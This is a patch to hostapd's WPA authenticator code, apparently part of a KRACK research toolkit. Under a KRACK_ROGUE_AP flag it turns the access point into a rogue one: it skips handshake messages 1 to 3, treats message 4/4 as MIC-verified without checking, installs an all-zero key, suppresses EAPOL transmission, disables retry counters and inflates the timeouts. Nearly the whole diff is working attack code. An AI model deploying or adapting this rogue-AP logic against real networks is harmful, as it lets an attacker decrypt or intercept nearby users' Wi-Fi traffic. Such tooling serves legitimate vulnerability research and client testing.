@@ -28,6 +28,8 @@
 #include "wpa_auth_i.h"
 #include "wpa_auth_ie.h"
 
+#include "common/attacks.h"
+
 #define STATE_MACHINE_DATA struct wpa_state_machine
 #define STATE_MACHINE_DEBUG_PREFIX "WPA"
 #define STATE_MACHINE_ADDR sm->addr
@@ -62,9 +64,9 @@ static u8 * ieee80211w_kde_add(struct wpa_state_machine *sm, u8 *pos);
 
 static const u32 dot11RSNAConfigGroupUpdateCount = 4;
 static const u32 dot11RSNAConfigPairwiseUpdateCount = 4;
-static const u32 eapol_key_timeout_first = 100; /* ms */
-static const u32 eapol_key_timeout_subseq = 1000; /* ms */
-static const u32 eapol_key_timeout_first_group = 500; /* ms */
+static const u32 eapol_key_timeout_first = 1000000; /* ms */
+static const u32 eapol_key_timeout_subseq = 1000000; /* ms */
+static const u32 eapol_key_timeout_first_group = 1000000; /* ms */
 
 /* TODO: make these configurable */
 static const int dot11RSNAConfigPMKLifetime = 43200;
@@ -999,6 +1001,25 @@ void wpa_receive(struct wpa_authenticator *wpa_auth,
 		msgtxt = "2/4 Pairwise";
 	}
 
+#ifdef KRACK_ROGUE_AP
+	// We just wait for Msg 4/4 and then install an all-zero TK
+	if (msg != PAIRWISE_4) {
+		printf(">>> %s: Igning non-msg4 EAPOL frame\n", __FUNCTION__);
+		return;
+	}
+
+	printf(">>> %s: treating as valid msg4 EAPOL frame\n", __FUNCTION__);
+	sm->wpa_ptk_state = WPA_PTK_PTKINITNEGOTIATING;
+	sm->MICVerified = 1;
+
+	sm->rx_eapol_key_secure = 1;
+	sm->EAPOLKeyReceived = TRUE;
+	sm->EAPOLKeyPairwise = TRUE;
+	sm->EAPOLKeyRequest = FALSE;
+	wpa_sm_step(sm);
+	return;
+#endif
+
 	/* TODO: key_info type validation for PeerKey */
 	if (msg == REQUEST || msg == PAIRWISE_2 || msg == PAIRWISE_4 ||
 	    msg == GROUP_2) {
@@ -1603,8 +1624,13 @@ void __wpa_send_eapol(struct wpa_authenticator *wpa_auth,
 
 	wpa_auth_set_eapol(sm->wpa_auth, sm->addr, WPA_EAPOL_inc_EapolFramesTx,
 			   1);
+#ifdef KRACK_ROGUE_AP
+	// Note: there is never any point in sending EAPOL frames, because we do not know the valid KCK and KEK.
+	printf(">>>> %s: not sending EAPOL frame\n", __FUNCTION__);
+#else
 	wpa_auth_send_eapol(wpa_auth, sm->addr, (u8 *) hdr, len,
 			    sm->pairwise_set);
+#endif
 	os_free(hdr);
 }
 
@@ -1995,7 +2021,9 @@ SM_STATE(WPA_PTK, PTKSTART)
 	sm->TimeoutEvt = FALSE;
 	sm->alt_snonce_valid = FALSE;
 
+#ifndef KRACK_ROGUE_AP
 	sm->TimeoutCtr++;
+#endif
 	if (sm->TimeoutCtr > (int) dot11RSNAConfigPairwiseUpdateCount) {
 		/* No point in sending the EAPOL-Key - we will disconnect
 		 * immediately following this. */
@@ -2683,7 +2711,9 @@ SM_STATE(WPA_PTK, PTKINITNEGOTIATING)
 	SM_ENTRY_MA(WPA_PTK, PTKINITNEGOTIATING, wpa_ptk);
 	sm->TimeoutEvt = FALSE;
 
+#ifndef KRACK_ROGUE_AP
 	sm->TimeoutCtr++;
+#endif
 	if (sm->TimeoutCtr > (int) dot11RSNAConfigPairwiseUpdateCount) {
 		/* No point in sending the EAPOL-Key - we will disconnect
 		 * immediately following this. */
@@ -3046,7 +3076,9 @@ SM_STATE(WPA_PTK_GROUP, REKEYNEGOTIATING)
 
 	SM_ENTRY_MA(WPA_PTK_GROUP, REKEYNEGOTIATING, wpa_ptk_group);
 
+#ifndef KRACK_ROGUE_AP
 	sm->GTimeoutCtr++;
+#endif
 	if (sm->GTimeoutCtr > (int) dot11RSNAConfigGroupUpdateCount) {
 		/* No point in sending the EAPOL-Key - we will disconnect
 		 * immediately following this. */
